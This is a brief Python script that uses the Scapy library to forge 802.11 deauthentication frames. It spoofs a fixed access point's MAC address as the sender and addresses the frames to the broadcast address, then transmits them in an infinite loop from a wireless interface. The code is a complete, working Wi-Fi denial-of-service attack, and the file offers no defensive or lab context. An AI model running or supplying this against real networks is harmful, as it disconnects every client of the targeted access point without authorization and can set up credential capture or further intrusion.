from scapy.all import *
import sys

from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth

target_mac = "ff:ff:ff:ff:ff:ff"
gateway_mac = "6a:c3:02:d6:95:a6"
# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
dot11 = Dot11(addr1 = target_mac, addr2 = gateway_mac, addr3 = gateway_mac)
# stack them up
#packet = RadioTap() / Dot11(add1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=2)
packet = RadioTap()/dot11/Dot11Deauth(reason=7)
# send the packet
while 1:
    sendp(packet, iface="wlan1", verbose = False)